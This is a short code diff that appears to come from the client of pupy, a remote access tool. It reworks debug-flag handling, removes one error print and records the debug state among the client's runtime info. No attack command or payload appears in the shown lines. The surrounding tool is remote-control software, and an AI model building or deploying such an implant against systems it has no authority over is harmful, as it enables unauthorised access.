@@ -79,7 +79,6 @@ logging.getLogger().setLevel(logging.WARNING)
 try:
     import pupy
 except ImportError, e:
-    print 'Couldnt load pupy: {}'.format(e)
     mod = imp.new_module("pupy")
     mod.__name__ = "pupy"
     mod.__file__ = "pupy://pupy"
@@ -106,6 +105,8 @@ def safe_obtain(proxy):
 def obtain(proxy):
     """ allows to convert netref types into python native types """
     return safe_obtain(proxy)
+
+debug = False
 
 setattr(pupy, 'obtain', obtain) # I don't see a better spot to put this util
 
@@ -268,7 +269,6 @@ def handle_sigchld(*args, **kwargs):
     os.waitpid(-1, os.WNOHANG)
 
 attempt = 0
-debug = False
 
 def main():
     global LAUNCHER
@@ -295,9 +295,13 @@ def main():
             nargs=argparse.REMAINDER,
             help="launcher arguments")
         args = parser.parse_args()
-        if args.debug:
+
+        if not debug:
+            debug = bool(args.debug)
+
+        if debug:
             logging.getLogger().setLevel(logging.DEBUG)
-        debug = bool(args.debug)
+
         LAUNCHER = args.launcher
         LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))
 
@@ -327,6 +331,7 @@ def main():
     pupy.infos['launcher_args'] = LAUNCHER_ARGS
     pupy.infos['launcher_inst'] = launcher
     pupy.infos['transport'] = launcher.get_transport()
+    pupy.infos['debug'] = debug
     pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
 
     exited = False
